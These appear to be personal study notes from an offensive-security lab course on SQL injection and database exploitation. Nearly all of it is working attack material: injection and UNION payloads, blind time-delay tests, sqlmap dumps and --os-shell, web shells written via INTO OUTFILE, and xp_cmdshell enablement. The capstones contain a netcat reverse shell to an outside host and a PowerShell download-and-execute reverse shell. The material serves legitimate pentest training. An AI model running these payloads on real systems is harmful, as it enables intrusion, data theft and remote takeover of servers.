- mysql remote login (default mysql port number is 3306)
```sh
mysql -u root -p'root' -h <ip address> -P 3306
```

- basic enumeration
```sql
# version
select version();

# user
select system_user();

# list databases
show databases;
```

- MSSQL login 
```sh
impacket-mssqlclient Administrator:Lab123@<ip-addr> -windows-auth
```

 - basic enumeration
```sql
# version
select @@version;

# List all available databases
select name from sys.databases;

# List tables in a database
select * from database.information_schema.tables;
```

- SQL injection
``` sql
# general test 
' or 1=1; -- //

' or 1=1 in (select version()); -- //

' or 1=1 in (select username from users); -- //

' or 1=1 in (select password from users where username = 'admin'); -- //
```

- Union SQL injection
``` sql
# check number of columns 
' ORDER BY 1-- //
' ORDER BY 2-- //
... until failure

# enumerate database
%' UNION SELECT database(), user(), @@version, null, null -- //

# in the event that the first value gets cut off
' UNION SELECT null, null, database(), user(), @@version  -- //
```

- Blind SQL injections
```sql 
# using URL
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

- Manual code execution in Microsoft SQL server
```sh
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
```sql
EXECUTE sp_configure 'show advanced options', 1;

RECONFIGURE;

EXECUTE sp_configure 'xp_cmdshell', 1;

RECONFIGURE;
# Now have command execution
EXECUTE xp_cmdshell 'whoami';
```

- Manual code execution on mySQL 
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

```sh
# The written PHP code file results in the following: 
<? system($_REQUEST['cmd']); ?>

# potential payload to access webshell
curl http://domain.com/tmp/webshell.php?cmd=id
```

- Automating code execution using sqlmap 
```
# -u = URL to scan
# -p = parameter to test

sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user

# dump database (NOT STEALTH)
sqlmap -u http://192.168.203.19/blindsqli.php?user=1 -p user --dump

# dump database and specific table
sqlmap -u http://192.168.203.19/blindsqli.php?user=1 -p user -D offsec -T users --dump

# dump database and specific table and specific column
sqlmap -u http://192.168.203.19/blindsqli.php?user=1 -p user -D offsec -T users --dump -C description


# Getting a shell
# first save POST request via Burp in a local text file (post.txt)
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

*post.txt*
```txt
POST /search.php HTTP/1.1
Host: 192.168.50.19
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.50.19
Connection: close
Referer: http://192.168.50.19/search.php
Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
Upgrade-Insecure-Requests: 1

item=test
```


- Capstone 1
```
# Scan wordpress site for vulnerable plugins
wpscan --url http://alvida-eatery.org 

# See vulnerable survey plugin and lookup exploit

# John to crack hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Find flag.txt on linux system
find /* -iname "*.txt" 2>/dev/null
```

- Capstone 2
```
# Enumerate site and see that email subscription is the only field
# determine if sql injection is present
concat('a', 'b') 

# try basic with no luck
'or 1=1 in (select @@version); -- //

# determine columns and union select
'order by 1# 
'order by 2# 
...

# determine which column is vulnerable
%' UNION SELECT null, null, database(), user(), @@version, null  -- //
# we get the version number with this. move user to version position to test
%' UNION SELECT null, null, database(), version(), user(), null  -- //

# column 5 is vulnerable
# check root path 
%' UNION SELECT null, null, null, null, load_file('/etc/nginx/sites-available/default'), null -- //

       ...
        # include snippets/snakeoil.conf;

        root /var/www/html;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html index.php; 
		...

# upload web shell to the path
%' UNION SELECT null, null, database(), version(), "<?php system($_GET['cmd']);?>", null into outfile "/var/www/html/webshell.php" -- //

# output flag.txt
curl http://192.168.237.48/webshell.php?cmd=cat%20../flag.txt
```

- Capstone 3
```
# Explore webpage and test all POST request variables
';concat('a','b')-- //

# height variable has sql injection. We get an error message

# next determine number of columns
'order by 7; -- 
# success with 6 means 6 columns
'order by 6; -- 

# start testing each column 
# try version(), current_database(), user
# check types of columns by casting 
# Error messages can be used for enumeration

'union select null, cast(version() as int), null, null, null, null --

# Getting code execution 
';DROP TABLE IF EXISTS commandexec; CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/sh 192.168.45.227 443';--
```

- Capstone 4
```
# Enumerate webpage and find login
# test username and password for sql injection
'concat('a','b');--

# recieved error. We know it MSsql. Try to check version and user 
# we can try using error messages for incorrect syntax but get nothing with correct syntax
# check for time delay (blindsqli)
'waitfor delay '00:00:10'--

# hmm this works...
# lets try to enable xp_cmdshell
# one liner to enable xp_cmdshell
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Download and run powershell reverse shell script
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.227:80/rev.ps1") | powershell -noprofile'

# search for flag with powershell
Get-ChildItem -Path C:\ -Include flag.txt -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {Get-Content $_.FullName} 2>$null
```

